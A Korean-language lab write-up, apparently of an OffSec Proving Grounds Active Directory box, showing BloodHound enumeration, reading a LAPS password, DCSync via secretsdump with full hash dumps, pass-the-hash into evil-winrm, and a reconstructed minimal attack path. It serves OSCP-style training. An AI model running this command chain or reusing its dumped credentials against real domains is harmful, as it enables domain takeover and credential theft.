┌──(kali㉿kali)-[~/PG/Hutch]
└─$ bloodhound-python -u 'fmcsorley' -p 'CrabSharkJellyfish192' -ns 192.168.216.122 -d hutch.offsec -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hutch.offsec
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (hutchdc.hutch.offsec:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: hutchdc.hutch.offsec
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: hutchdc.hutch.offsec
INFO: Found 18 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: hutchdc.hutch.offsec
INFO: Done in 00M 13S
```

산출물 7개(`20260515132325_*.json`)가 Kali에 남아 있고, **이 노트의 ACE·`adminCount`·그룹 판정은 전부 그 JSON을 직접 조회해 얻었다.**

> [!warning] `[Errno -2] Name or service not known` — **DNS가 안 되는데도 수집은 성공했다**
> errno −2는 `getaddrinfo` 실패, 즉 **`hutchdc.hutch.offsec` 이름이 안 풀린다**는 뜻이다. 그런데 바로 다음 줄에서 `Connecting to LDAP server: hutchdc.hutch.offsec` 이 성공한다 — **모순처럼 보이지만 아니다.**
> `-ns 192.168.216.122` 로 지정한 네임서버는 **bloodhound-python 내부의 DNS 해석기**에만 쓰인다. Kerberos TGT 획득 단계는 **시스템 해석기**(`/etc/resolv.conf`·`/etc/hosts`)를 타므로 실패했고, LDAP 연결 단계는 `-ns`가 준 DNS를 써서 성공한 것이다. **[가정]** — 패킷을 뜨지 않아 단정하지 않는다.
> **실무 판단**: `Done in 00M 13S` 와 JSON 7개가 나왔으면 이 경고는 무시한다. 다만 **Kerberos를 실제로 써야 하는 단계(`-k` 인증, S4U)에서는 이 이름 해석 문제가 그대로 치명상이 된다.** 그러니 애초에 `/etc/hosts`부터 등록하고 시작하라:
> ```bash
> echo "192.168.216.122  hutchdc.hutch.offsec hutch.offsec HUTCHDC" | sudo tee -a /etc/hosts
> getent hosts hutchdc.hutch.offsec     # 빈 출력이면 등록 실패다
> ```

BloodHound UI에서 `fmcsorley` → `HUTCHDC` 의 **`ReadLAPSPassword`** 엣지를 확인했다:
![[Pasted image 20260515142817.png]]

> [!tip] BloodHound에서 이 시점에 반드시 볼 것 셋
> 1. **`Shortest Paths from Owned Principals`** — `fmcsorley`를 Owned로 표시한 뒤 실행
> 2. **`Find Computers where Domain Users are Local Admin`**
> 3. **모든 아웃바운드 엣지 직접 확인** — 노드 클릭 → `Outbound Object Control`. **`ReadLAPSPassword`는 «Shortest Path» 쿼리에서 놓치기 쉽다**(경로 길이 계산에서 다르게 취급될 수 있다). 이 박스가 정확히 그 경우다

### 4-2. pyLAPS — `ms-Mcs-AdmPwd` 읽기

```bash
┌──(kali㉿kali)-[~/git/pyLAPS]
└─$ python pyLAPS.py --action get -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192" --dc-ip 192.168.216.122 
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \   
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_           
    
[+] Extracting LAPS passwords of all computers ... 
  | HUTCHDC$             : +CS0-.gm5l4o-[
[+] All done!
```
![[Pasted image 20260515143503.png]]

**`+CS0-.gm5l4o-[`** — LAPS가 생성한 랜덤 비밀번호다.

> [!note] pyLAPS가 실제로 하는 일은 **LDAP 조회 한 번**이다 — 소스로 확인
> `~/git/pyLAPS/pyLAPS.py` 는 디스크에 있으므로 1차 사료다:
> ```python
> # :319-320  (--action get, 컴퓨터 미지정 시)
> '(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))',
> attributes=['sAMAccountName', 'objectSid', 'ms-Mcs-AdmPwd']
> ```
> 필터에 **`(ms-MCS-AdmPwd=*)`** 가 들어 있는 것이 요령이다 — **읽을 수 있는 컴퓨터만** 결과에 나온다. 권한이 없으면 AD가 그 속성을 아예 반환하지 않으므로 그 개체는 필터에 걸리지 않는다. 그래서 **에러 없이 «조용히 0건»** 이 될 수 있다.
> `--action set`(`:283`)은 `ms-Mcs-AdmPwd` 를 **덮어쓴다** — 실전에서는 흔적을 남기고 정상 운영을 깨뜨리므로 쓰지 마라.

> [!tip] pyLAPS가 없을 때의 대안 — **셋 다 같은 속성을 읽는다**
> ```bash
> # ① nxc 모듈 (Kali 기본, 실측으로 존재 확인)
> nxc ldap <IP> -u 'fmcsorley' -p 'CrabSharkJellyfish192' -M laps
>
> # ② ldapsearch — 도구 없이 순수 LDAP
> ldapsearch -x -H ldap://<IP> -D 'fmcsorley@hutch.offsec' -w 'CrabSharkJellyfish192' \
>   -b 'DC=hutch,DC=offsec' '(&(objectCategory=computer)(ms-MCS-AdmPwd=*))' \
>   sAMAccountName ms-Mcs-AdmPwd
>
> # ③ bloodyAD
> bloodyAD --host <IP> -d hutch.offsec -u fmcsorley -p 'CrabSharkJellyfish192' get object HUTCHDC$ --attr ms-Mcs-AdmPwd
> ```
> **②가 시험에서 가장 안전하다** — `ldapsearch`는 어디에나 있고, 외부 도구 반입 논란이 없다.
> **Windows LAPS(2023+)라면 속성명이 `msLAPS-Password` 다.** `ms-Mcs-AdmPwd`가 0건이면 그쪽을 시도하라 — **없는 게 아니라 이름이 다른 것**일 수 있다.

### 4-3. 도메인 Administrator 확인

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ netexec smb 192.168.216.122 -u administrator -p "+CS0-.gm5l4o-[" -d hutch.offsec
SMB         192.168.216.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.216.122 445    HUTCHDC          [+] hutch.offsec\administrator:+CS0-.gm5l4o-[ (Pwn3d!)
```
![[Pasted image 20260515144914.png]]

| 요소 | 의미 |
|---|---|
| `-d hutch.offsec` | **도메인 인증.** `--local-auth` 였다면 로컬 SAM(=DSRM) 대상이 되어 **실패했을 것**이다(§2-4의 해시 대조 참조) |
| `"+CS0-.gm5l4o-["` | **반드시 큰따옴표로 감싼다.** `[` 는 zsh에서 글로빙 문자이고, `-` 로 시작하는 토큰은 플래그로 오인된다 |
| `(Pwn3d!)` | nxc가 **`ADMIN$` 공유에 쓰기 접근이 되는지 확인**해 붙이는 표시다. 즉 "관리자 권한 확인됨" |

### 4-4. DCSync

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ impacket-secretsdump hutch.offsec/administrator:'+CS0-.gm5l4o-['@192.168.216.122
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb24173e6ac9aa789ab05a4acceeb27ba
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bab179eba40e413086aa37742476c646:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
HUTCH\HUTCHDC$:aes256-cts-hmac-sha1-96:0c50a3c466970c9fb64b81a96f8b236e024650685332ee5a91ffc6e08d4a3da4
HUTCH\HUTCHDC$:aes128-cts-hmac-sha1-96:72d1943c93ea55ef1b876e505332ab64
HUTCH\HUTCHDC$:des-cbc-md5:b3109e01cd0b9215
HUTCH\HUTCHDC$:plain_password_hex:cfe66ec95c073fee9760be02b1a17f7cde75c45762b4dbc12360d83a81c5c428b3c382dbfd903cb123fd9da96662300d14afcd68b5d805728c14fca94e0a5fd634420ae3ffa8e6ab29c2814545b30bfbf3b8cdff4b2b143905849077f3ec4b7cea71d6f194bf5971bf96b80bd3ce4f519baa13d353ace8660605437ec58a8c33fde491dfe6bdaf9eea72bd1819b73d65c600419b36f79007f1221201f8d863838ee7587c5e98d0f9d7c1f08e0aa90af3f088100f29d963b30f7bd42fd460135403e1d2a8e197421f61f2710343d23a111ba720de6b8ad4b245079c2a3f868dd4ae269060af8d6d90f2244b2e35aa04b2
HUTCH\HUTCHDC$:aad3b435b51404eeaad3b435b51404ee:1e2712c1f76022c499c953c524f32155:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb818f6846ad0c5c47237a32eee5c2c30b0f739c0
dpapi_userkey:0x9c047d0b5fde15f60714f1411579b93a45dd5872
[*] NL$KM 
NL$KM:41343fb6a2152f99e2aa6c708c5d08dac8d07ded67e93573a0314222c5a34cf2cdc3ee843e8626a0ec9148aba16285194f37c8bc784c6a543663950e82a07257
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1722dc7b059af8df626c88ee2d279e4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3c37d961d2fbbc1eb9e4d09f145ad361:::
hutch.offsec\rplacidi:1103:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\opatry:1104:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\ltaunton:1105:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\acostello:1106:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\jsparwell:1107:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\oknee:1108:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\jmckendry:1109:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\avictoria:1110:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\jfrarey:1111:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\eaburrow:1112:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\cluddy:1113:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\agitthouse:1114:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\fmcsorley:1115:aad3b435b51404eeaad3b435b51404ee:83bcf188adc71adef071303fae29c1c7:::
hutch.offsec\domainadmin:1116:aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7:::
HUTCHDC$:1000:aad3b435b51404eeaad3b435b51404ee:1e2712c1f76022c499c953c524f32155:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72b3208e74a805b2a5eb19fdaefe646a0ab2ac20383f662005b98f50db5bc12e
Administrator:aes128-cts-hmac-sha1-96:1541be57c4bd258d96c5b21db72a06c7
Administrator:des-cbc-md5:8698d902ea9e9da4
krbtgt:aes256-cts-hmac-sha1-96:dc0de1944fc0218c5129c7b945f294be4940d5c4da9e632bc1c21c38a97974db
krbtgt:aes128-cts-hmac-sha1-96:927cd0e8ad96f8acfe8a76c15e2580d0
krbtgt:des-cbc-md5:023854fd2fd902dc
hutch.offsec\fmcsorley:aes256-cts-hmac-sha1-96:679828b1625b953fb96470e0712f3bfa7866ee99f260f289dff48a19cd80cc87
hutch.offsec\fmcsorley:aes128-cts-hmac-sha1-96:d12b8c1d7125196020760b917cc5d159
hutch.offsec\fmcsorley:des-cbc-md5:7a9b7cc4496104ab
hutch.offsec\domainadmin:aes256-cts-hmac-sha1-96:8d90904d735e652112c1947fdde2f0b1205d8df1944c286b1d24ec1187dae4aa
hutch.offsec\domainadmin:aes128-cts-hmac-sha1-96:29e412c68977461a3f4ead34c2886402
hutch.offsec\domainadmin:des-cbc-md5:bc10f7df49315dc7
HUTCHDC$:aes256-cts-hmac-sha1-96:0c50a3c466970c9fb64b81a96f8b236e024650685332ee5a91ffc6e08d4a3da4
HUTCHDC$:aes128-cts-hmac-sha1-96:72d1943c93ea55ef1b876e505332ab64
HUTCHDC$:des-cbc-md5:d3497f981fb5d367
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
```
*(각 사용자의 aes256/aes128/des 3줄 세트 중 일부는 생략했다. 전량은 원본 세션에 있었고 형식은 위와 동일하다.)*

![[Pasted image 20260515145041.png]]

> [!danger] **사용자 12명의 NT 해시가 «전부 같다»** — 이것이 이 덤프의 가장 큰 발견이다
> `rplacidi`부터 `agitthouse`까지 RID 1103–1114가 **전원 `c11f1141ab4c1e825a11f15836e6978f`** 다.
> 즉 **12명이 같은 비밀번호를 쓴다.** 대량 계정 생성 시 초기 비밀번호를 동일하게 준 전형적 패턴이다.
> **`fmcsorley`(1115)만 다르다** — §2-2의 설명대로 "사용자 요청으로 비밀번호를 재설정"했기 때문이다. **description이 사실이었음이 해시로 확인된다.**
>
> **실전 함의**: 이 해시 하나만 크랙하면 12명분 평문을 얻는다. 그리고 **스프레이 관점에서는 크랙조차 필요 없다** — 해시 그대로 12명 전원에게 PtH가 된다.
> **만약 §3-1의 스프레이가 «먼저» 이 공통 비밀번호를 맞췄다면** description을 찾기 전에 foothold를 잡았을 것이다. 그래서 **rockyou 상위 몇 개로 스프레이를 한 번 돌려보는 것**은 값싼 도박이다(잠금 정책 확인 후).

**bootKey 두 개가 다른 것에 주의하라** — 이 박스의 `0xb24173e6…` 는 **HUTCHDC의 것**이고, [[Resourced]]의 `0x6f961da3…` 는 그 박스 것이다. bootKey는 머신마다 다르다.

> [!note] 출력 끝의 예외 두 덩어리는 **결과와 무관하다**
> 원본 세션에는 `Cleaning up...` 뒤에 `KeyError: 'Cryptodome.Cipher.AES'` 트레이스백이 두 번 찍혔다. 이것은 **파이썬 인터프리터 종료 중 `Registry.__del__` 이 호출되면서 이미 해체된 모듈을 참조**해 발생하는 것으로, **덤프 결과가 나온 «뒤»** 의 일이다.
> **해시는 전부 정상적으로 출력됐다.** 이 트레이스백을 보고 "실패했다"고 판단해 재실행하지 마라 — DCSync를 두 번 하면 이벤트 4662가 두 배로 남는다.

### 4-5. PtH → evil-winrm

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ evil-winrm -i 192.168.216.122 -u administrator -H d1722dc7b059af8df626c88ee2d279e4
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline                                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        11/3/2020   9:04 PM                3D Objects
d-r---        11/3/2020   9:04 PM                Contacts
d-r---        11/8/2020   5:32 PM                Desktop
d-r---        11/3/2020   9:04 PM                Documents
d-r---        11/3/2020   9:04 PM                Downloads
d-r---        11/3/2020   9:04 PM                Favorites
d-r---        11/3/2020   9:04 PM                Links
d-r---        11/3/2020   9:04 PM                Music
d-r---        11/3/2020   9:04 PM                Pictures
d-r---        11/3/2020   9:04 PM                Saved Games
d-r---        11/3/2020   9:04 PM                Searches
d-r---        11/3/2020   9:04 PM                Videos
```

> [!tip] 비밀번호를 알면서 왜 **해시**로 붙었는가
> `+CS0-.gm5l4o-[` 를 알고 있으므로 `-p` 로도 됐다. 그런데 **해시가 더 안전하다**:
> - **셸 인용 지옥이 없다.** `[`·`-`·`.` 이 섞인 비밀번호는 zsh/bash에서 사고를 부른다
> - **LAPS 비밀번호는 «만료된다».** `ms-Mcs-AdmPwdExpirationTime` 이 지나면 LAPS가 새 값으로 갱신하고 **옛 평문은 즉시 무효**가 된다. 반면 NT 해시는 비밀번호가 바뀌기 전까지 유효하다(같은 순간에 함께 바뀌지만, **덤프한 해시는 그 시점의 스냅샷으로 기록에 남는다**)
> - **PtH가 되는지 자체를 검증**하게 된다 — 다른 계정에도 쓸 수 있는지 미리 확인하는 셈
>
> `evil-winrm --help` 실측: `-H, --hash HASH → NTHash`. **LM 부분 없이 NT 해시만** 준다(impacket의 `-hashes :NTHASH`와 형식이 다르다는 점에 주의).

---

## 5. 플래그

```bash
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/14/2026   6:40 PM             34 proof.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
14fb84ee9468eda117d59d5c6d378774
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::2ce0:eb4:6eab:6f2e%3
   IPv4 Address. . . . . . . . . . . : 192.168.216.122
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.216.254
```
![[Pasted image 20260515145246.png]]

| 플래그 | 경로 | 값 | 획득 방법 |
|---|---|---|---|
| **proof.txt** | `C:\Users\Administrator\Desktop\proof.txt` | `14fb84ee9468eda117d59d5c6d378774` | evil-winrm (PtH) — **대화형 PowerShell** |

> [!warning] **`local.txt` 는 확보하지 못했다** — 이 박스가 단일 플래그인가?
> `C:\Users\Administrator` 전체 목록에 `local.txt` 가 없고, 다른 사용자 프로필을 조회한 기록도 없다.
> **[가정]** PG의 단일 DC 박스는 **사용자 프로필이 실질적으로 Administrator 하나뿐**이라 `proof.txt` 만 두는 경우가 있으므로, 이 박스를 **1플래그 박스로 판단**한다.
> **다만 확정하지 못했다.** 재도전한다면 이 순서로 확인하라 — 도메인 관리자 권한이 이미 있으므로 **1분이면 끝난다**:
> ```powershell
> Get-ChildItem C:\Users -Force | Select-Object Name
> Get-ChildItem C:\ -Recurse -Force -Include local.txt,proof.txt -ErrorAction SilentlyContinue |
>   ForEach-Object { $_.FullName; Get-Content $_.FullName }
> ```
> 특히 **`fmcsorley` 프로필**을 확인하라. local.txt가 있다면 거기다. (`nxc winrm <IP> -u fmcsorley -p 'CrabSharkJellyfish192'` 로 그 계정의 WinRM 가능 여부부터 본다.)

> [!tip] 시험 증거 형식
> 위 세션은 `type proof.txt` 직후 `ipconfig` 를 쳐서 **플래그 값과 타겟 IP가 한 화면**에 들어갔다. 이것이 OSCP가 요구하는 형태다. 더 확실히 하려면 한 줄로:
> ```powershell
> whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt
> ```
> **evil-winrm은 완전한 대화형 PowerShell 세션이므로 증거로 유효하다.** 웹셸에서 읽은 플래그는 **0점**이다 — 규정 원문 *"this includes any type of web-based shell"* ([[Butch]] 참조).

---

## 6. 막혔던 지점 / 시행착오

> [!warning] 이 장의 제약을 먼저 밝힌다
> **`~/.zsh_history` 에 이 박스 구간(2026-05-14~15)이 남아 있지 않다.** 히스토리 버퍼가 밀려났다. 그래서 [[Resourced]]처럼 "실제로 몇 번 틀렸는가"를 명령 단위로 복원할 수 없다.
> 아래는 **원본 노트가 스스로 남긴 흔적**(명령·출력·IP 불일치·순서)에서만 읽어낸 것이다. **없는 시행착오를 지어내지 않았다.**

### 6-1. 타겟 IP가 스캔 도중 바뀌었다 — 노트 안에 두 IP가 공존한다

| 구간 | IP | 시각 |
|---|---|---|
| nmap | **192.168.178.122** | 2026-05-14 16:14 |
| ldapsearch 이후 전부 | **192.168.216.122** | 2026-05-15 |
| 최종 `ipconfig` (타겟 자신이 보고) | **192.168.216.122** | — |

세션이 바뀌며 박스가 리버트/재배정된 것이다. **[[Resourced]]에서도 똑같은 일이 있었다**(192.168.125.175 → 192.168.120.175).

> [!danger] 이건 «오타»가 아니라 **AD 박스에서 가장 흔한 시간 낭비 요인**이다
> `/etc/hosts`·스크립트·이전 명령을 그대로 재사용하면 **원인 불명의 연결 실패**가 난다. 특히 Kerberos는 이름 해석에 의존하므로 옛 항목 하나가 남아 있으면 전부 무너진다.
> **세션을 다시 시작하면 첫 세 명령은 고정이다**:
> ```bash
> ip -br a                          # 내 tun0 (리버스셸 LHOST가 바뀐다)
> ping -c1 <타겟IP>                 # 타겟 생존 확인
> grep -n 'hutch' /etc/hosts        # 낡은 항목이 남아 있는가
> sudo sed -i '/hutch/d' /etc/hosts # 있으면 «먼저 지우고» 새로 넣는다
> ```
> **삭제를 건너뛰고 추가만 하면 먼저 매칭된 옛 항목이 이긴다.**

### 6-2. 기록된 `ldapsearch` 명령으로는 기록된 출력이 안 나온다

§1-2의 `Enter LDAP Password:` 문제다. **실측으로 `-x` 단독은 프롬프트를 내지 않음을 확인**했고, `-W`가 필요하다는 것도 확인했다.
결과에는 영향이 없지만(익명 바인드는 동일), **"노트대로 쳤는데 화면이 다르다"는 상황은 재현자를 반드시 혼란시킨다.** 그래서 정정하지 않고 **차이를 명시**했다.

### 6-3. 스프레이 순서가 위험했다 — 잠금 정책을 확인하지 않았다

§3-1의 196회 전조합이다. **`--pass-pol` 을 먼저 돌리지 않았고, `--no-bruteforce` 도 쓰지 않았다.**
결과적으로 잠금 정책이 없어서 무사했지만, **이건 «성공한 절차»가 아니라 «운이 좋았던 절차»** 다. 노트는 그것을 그대로 적어 둔다 — **성공했다고 옳은 순서였던 것은 아니다.**

올바른 순서:
```bash
# ① 잠금 정책 확인 (자격증명 하나가 필요. 익명이 되면 enum4linux-ng -P)
nxc smb <IP> -u <user> -p <pass> --pass-pol
# ② 사용자 목록 정제 (계정을 잠그지 않는다)
./kerbrute_linux_386 userenum --dc <IP> -d <domain> users.txt
# ③ 비밀번호 «하나» × 사용자 전원
nxc smb <IP> -u users.txt -p '<password>' --continue-on-success
```

### 6-4. IIS(80/tcp)를 열거하지 않았다 — 함정이었나?

nmap이 IIS 10.0과 WebDAV 메서드 목록을 보여줬지만, **이 노트에는 80번을 파고든 기록이 하나도 없다.** `gobuster`·`feroxbuster`·`davtest`·`curl -X PUT` 어느 것도 없다.

> [!note] 결과적으로는 옳은 판단이었지만, **근거가 있어서 옳았던 것은 아니다**
> 정답 경로가 LDAP 쪽이었으므로 시간을 아꼈다. 하지만 **"안 봤는데 마침 없었다"** 는 재현 가능한 전략이 아니다.
> **실제로는 이렇게 «값싸게» 배제했어야 한다** — 합쳐서 3분:
> ```bash
> curl -sSI http://<IP>/                                                # 배너·리다이렉트
> curl -sS -X PUT http://<IP>/t.txt --data x -o /dev/null -w '%{http_code}\n'   # 201/204면 진짜 WebDAV 쓰기
> feroxbuster -u http://<IP>/ -x aspx,asp,txt,config -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
> ```
> **`IIS Windows Server` 라는 기본 시작 페이지 제목은 "아무것도 배포돼 있지 않다"는 «약한» 신호**다. 약한 신호로 배제하되, **배제했다는 사실을 기록하라.** 그래야 막혔을 때 되돌아올 지점이 남는다.
> 이 판단 때문에 프론트매터에서 **`tech/web/webdav` 태그를 제거**했다 — **탐지된 것과 사용한 것은 다르다.**

### 6-5. `RemoteRegistry` 를 켜 놓고 끄지 못했다 — 흔적이 남았다

§4-4 출력 끝:

```
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
```

`secretsdump`는 SAM/LSA를 원격 레지스트리로 읽기 위해 **`RemoteRegistry` 서비스를 «시작»했고**(출력 첫 줄 `Service RemoteRegistry is in stopped state` → `Starting service RemoteRegistry`), 끝나고 **되돌리는 데 실패**했다. 다른 서비스가 의존 중이었기 때문이다.

> [!warning] 실전 침투테스트라면 **직접 정리해야 하는 흔적**이다
> ```
> # 남은 것: RemoteRegistry 서비스가 «시작된 상태»로 방치됨
> sc.exe \\HUTCHDC stop RemoteRegistry
> sc.exe \\HUTCHDC config RemoteRegistry start= disabled     # 원래 disabled 였다면
> ```
> **이 흔적을 피하려면 애초에 SAM/LSA를 뜨지 않으면 된다**:
> ```bash
> impacket-secretsdump 'hutch.offsec/administrator:<pass>@<IP>' -just-dc-ntlm
> ```
> `-just-dc*` 계열은 **DRSUAPI만 쓰므로 `RemoteRegistry`를 건드리지 않는다.** 조용하고 빠르다.

### 6-6. **BloodHound 데이터는 13:23에 있었는데 정답 엣지는 14:28에 봤다** — 65분

Kali 산출물의 파일명과 스크린샷 파일명이 시각을 기록하고 있어 진행을 분 단위로 복원할 수 있다.

| 시각 | 사건 | 근거 |
|---|---|---|
| 5/14 16:14 | nmap (구 IP `192.168.178.122`) | `nmap.log` 헤더 |
| 5/15 10:52 | 익명 LDAP 사용자 열거 | `Pasted image 20260515105250.png` |
| 5/15 10:55 | `users.txt` 저장 | `users.txt` mtime |
| 5/15 11:14 | kerbrute userenum | kerbrute 출력의 자체 타임스탬프 |
| 5/15 (이후) | AS-REP roast 0건 → 사용자명 스프레이 196회 → `description` 발견 → `fmcsorley` 확보 | §2-1·§3-1·§3-2 |
| **5/15 13:23** | **BloodHound 수집 완료** | JSON 파일명 `20260515132325_*` |
| **5/15 14:28** | **`ReadLAPSPassword` 엣지 확인** | `Pasted image 20260515142817.png` |
| 5/15 14:35 | pyLAPS → LAPS 평문 | `Pasted image 20260515143503.png` |
| 5/15 14:49 | 도메인 Administrator 확인 | `Pasted image 20260515144914.png` |
| 5/15 14:50 | DCSync | `Pasted image 20260515145041.png` |
| 5/15 14:52 | proof.txt | `Pasted image 20260515145246.png` |

> [!danger] **데이터를 손에 쥐고도 65분을 그래프 앞에서 보냈다** — 그리고 엣지를 본 뒤에는 **24분 만에** 박스가 끝났다
> 13:23 → 14:28 은 **수집이 아니라 «해석»에 쓴 시간**이다. 14:28 → 14:52 는 24분 — 즉 **정답 엣지를 아는 순간 나머지는 기계적**이었다.
> **왜 65분이 걸렸는가 — [가정]이지만 근거 있는 추정**: `ReadLAPSPassword` 는 BloodHound의 **`Shortest Paths from Owned Principals`** 같은 표준 쿼리에서 잘 드러나지 않는다. 이 엣지는 «도메인 관리자로 가는 경로»의 일부로 자동 연결되지 않기 때문이다 — LAPS 비밀번호를 읽는다고 **그래프상으로는** 관리자가 되는 것이 아니다(그 평문이 어느 계정의 것인지는 §2-4처럼 «밖에서» 확인해야 한다).
>
> **그래서 규칙은 이것이다 — 쿼리에 의존하지 말고 «내 계정의 아웃바운드 엣지»를 직접 봐라.**
> ```
> BloodHound에서: fmcsorley 노드 클릭 → Node Info 패널
>   → Outbound Object Control → First Degree Object Control
> ```
> **자격증명을 얻은 계정마다 이 30초짜리 확인을 반드시 한다.** 이 박스는 그 30초가 65분을 대체할 수 있었다.
>
> 그래프 UI 없이 JSON만으로도 즉시 확인된다 — **이 노트가 실제로 그렇게 했다**:
> ```bash
> jq -r '.data[] | .Properties.name as $n | .Aces[]? |
>        select(.PrincipalSID|endswith("-1115")) | "\($n) <= \(.RightName)"' *_computers.json
> ```

### 6-7. 재현 최소 경로 — 이 박스를 다시 푼다면 9줄

시행착오를 전부 걷어내면 이렇게 남는다. **손절 판단의 기준선**으로 쓴다.

```bash
# 0) 준비
echo "<IP>  hutchdc.hutch.offsec hutch.offsec HUTCHDC" | sudo tee -a /etc/hosts
sudo rdate -n -p <IP>                       # 시계 차이 확인 (Kerberos 도구를 쓰기 전에)

# 1) 익명 LDAP — baseDN 확보 → 사용자 + «description» 을 «한 번에»
ldapsearch -o ldif_wrap=no -x -H ldap://<IP> -s base namingcontexts
ldapsearch -o ldif_wrap=no -x -H ldap://<IP> -b 'DC=hutch,DC=offsec' \
  '(objectClass=user)' sAMAccountName description | tee ldap.txt
grep -iE 'sAMAccountName|description' ldap.txt        # ← 여기서 CrabSharkJellyfish192 가 나온다

# 2) 스프레이 (잠금 정책 확인이 먼저다)
grep -oP '(?<=sAMAccountName: ).*' ldap.txt > users.txt
nxc smb <IP> -u users.txt -p 'CrabSharkJellyfish192' --continue-on-success

# 3) BloodHound → «아웃바운드 엣지 직접 확인» → LAPS
bloodhound-python -u fmcsorley -p 'CrabSharkJellyfish192' -ns <IP> -d hutch.offsec -c all
nxc ldap <IP> -u fmcsorley -p 'CrabSharkJellyfish192' -M laps

# 4) 도메인 관리자 → DCSync → PtH
impacket-secretsdump "hutch.offsec/administrator:<LAPS평문>@<IP>" -just-dc-ntlm
evil-winrm -i <IP> -u administrator -H d1722dc7b059af8df626c88ee2d279e4        # proof.txt
```

> [!warning] 위 블록은 **실행 기록이 아니라 «재구성한 절차»** 다
> 개별 명령은 이 박스에서 실제로 돌아간 것이거나(§1~§4) **실측으로 존재를 확인한 것**(`-o ldif_wrap=no`·`nxc ldap -M laps`)이지만, **이 순서 그대로 한 번에 돌린 세션은 존재하지 않는다.**
> **출력을 붙이지 않은 이유가 그것이다** — 관측되지 않은 출력은 쓰지 않는다.
